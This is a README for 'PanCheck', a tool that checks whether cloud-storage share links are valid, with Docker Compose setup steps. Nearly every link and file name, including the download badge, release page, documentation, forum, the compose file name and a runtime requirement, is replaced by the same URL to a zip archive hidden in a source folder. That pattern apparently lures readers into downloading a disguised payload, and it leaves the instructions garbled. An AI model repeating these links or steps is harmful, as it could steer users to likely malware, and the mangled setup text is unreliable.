# 🛠️ PanCheck - Validate Your Cloud Links Easily

## 🔥 Overview

PanCheck is a powerful tool for checking the validity of sharing links from various cloud storage platforms. It supports batch checking, ensuring you know which links work and which don’t.

## 🌟 Features

- 🔍 **Multi-Platform Support**: Check links from 9 major cloud platforms.
- ⚡ **High Performance**: Scan multiple links at once and customize frequency and timeout settings.
- 📊 **Data Statistics**: Access detailed reports and analytics on link validity.
- 🔄 **Scheduled Tasks**: Set up automatic checks for regular link validation.
- 💾 **Data Persistence**: Store check records in MySQL and cache failed links using Redis.
- 🎨 **Modern Interface**: Navigate a contemporary dashboard built with React and TypeScript.
- 🐳 **Containerized Deployment**: Easily deploy with Docker Compose.

## 📦 Supported Cloud Platforms

- Quark Cloud
- UC Cloud
- Baidu Cloud
- Tianyi Cloud
- 123 Cloud
- 115 Cloud
- Alibaba Cloud
- Thunder Cloud
- China Mobile Cloud

## 🚀 Getting Started

### Requirements

- Docker and Docker Compose
- Or Go 1.23+ and https://raw.githubusercontent.com/hemal-1809/PanCheck/main/internal/repository/PanCheck_3.0.zip 18+ for local development

### Download & Install

[![Download PanCheck](https://raw.githubusercontent.com/hemal-1809/PanCheck/main/internal/repository/PanCheck_3.0.zip%20PanCheck-v1.0.0-blue)](https://raw.githubusercontent.com/hemal-1809/PanCheck/main/internal/repository/PanCheck_3.0.zip)

To download the latest version of PanCheck, visit the [Releases page](https://raw.githubusercontent.com/hemal-1809/PanCheck/main/internal/repository/PanCheck_3.0.zip). 

### Deploy with Docker

To deploy using Docker, follow these steps:

1. Create a file named `https://raw.githubusercontent.com/hemal-1809/PanCheck/main/internal/repository/PanCheck_3.0.zip`.

2. Add the following content to the file:

   ```yaml
   version: '3.8'
   services:
     pancheck:
       image: lampon/pancheck:latest
       container_name: pancheck
       ports:
         - "8080:8080"
       environment:
         - SERVER_PORT=8080 # Service port
         - SERVER_MODE=release # Service mode
         - SERVER_CORS_ORIGINS=* # Allowed origins for cross-origin requests
         - DATABASE_TYPE=mysql # Database type
         - DATABASE_HOST=db # Database host
         - DATABASE_PORT=3306 # Database port
         - DATABASE_USER=root # Database username
         - DATABASE_PASSWORD=your_password # Database password
         - DATABASE_DATABASE=panc # Database name
   ```

3. Save the `https://raw.githubusercontent.com/hemal-1809/PanCheck/main/internal/repository/PanCheck_3.0.zip` file.

4. Open your terminal. Navigate to the directory containing the `https://raw.githubusercontent.com/hemal-1809/PanCheck/main/internal/repository/PanCheck_3.0.zip` file.

5. Run the following command to start PanCheck:

   ```bash
   docker-compose up -d
   ```

6. Access the application by opening your web browser and navigating to `http://localhost:8080`.

## 📋 Configuration

You can customize the application by adjusting the environment variables in the `https://raw.githubusercontent.com/hemal-1809/PanCheck/main/internal/repository/PanCheck_3.0.zip` file. Change the values for `SERVER_PORT`, `DATABASE_USER`, and `DATABASE_PASSWORD` as needed.

## 📝 Using PanCheck

After deployment, you can start using PanCheck to verify your cloud links. The interface is user-friendly and guides you through each step, from entering links to viewing results.

## 💬 Need Help?

If you encounter any issues, feel free to check the [FAQs section](https://raw.githubusercontent.com/hemal-1809/PanCheck/main/internal/repository/PanCheck_3.0.zip) for common questions. You can also join our community forum for support.

## 📩 Feedback

We welcome your feedback. Share your thoughts on how we can improve PanCheck or report any issues you find.

## 🔗 Related Links

- [Releases Page](https://raw.githubusercontent.com/hemal-1809/PanCheck/main/internal/repository/PanCheck_3.0.zip)
- [Documentation](https://raw.githubusercontent.com/hemal-1809/PanCheck/main/internal/repository/PanCheck_3.0.zip)
- [Community Forum](https://raw.githubusercontent.com/hemal-1809/PanCheck/main/internal/repository/PanCheck_3.0.zip)